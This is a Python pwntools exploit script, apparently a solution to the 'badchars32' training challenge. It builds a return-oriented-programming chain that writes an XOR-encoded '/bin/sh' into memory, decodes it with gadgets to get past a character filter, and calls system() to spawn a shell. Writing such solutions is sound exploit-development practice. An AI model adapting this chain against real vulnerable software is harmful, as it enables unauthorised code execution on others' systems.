from pwn import *

#pr = process("./badchars32")

def xorstring(toxor,key):
    retval = ""
    for letter in toxor:
        retval+= chr(ord(letter)^key)
    return retval

key = 0xf6
binsh = xorstring("/bin/sh",key)
binsh += "\x00"
bin = binsh[:4]
sh = binsh[4:]

address = 0x804a000

# for writing our string to memory
mov_aedi_esi = p32(0x08048893)
pop_esi_edi = p32(0x08048899)

# for xoring our string in data
x = p32(key)
xor_aebx_cl = p32(0x08048890)
pop_ebx_ecx = p32(0x08048896)
pop_ebx = p32(0x08048461)
pop_ecx = p32(0x08048897)

# for calling system
system = p32(0x80487b7)

# getting us on the stack
payload = "A"*44
#getting our string into memory
payload += pop_esi_edi + bin + p32(address) + mov_aedi_esi
payload += pop_esi_edi +  sh + p32(address+4) + mov_aedi_esi

payload += pop_ebx_ecx + p32(address) + x
for i in range(len(binsh)-1):
    payload += pop_ebx + p32(address + i) + xor_aebx_cl
payload +=   system  +p32(address)

print(payload)

#pr.sendline(payload)
#pr.interactive()
# *0x80487a8 before our own chars_to_addr
# *0x8048462
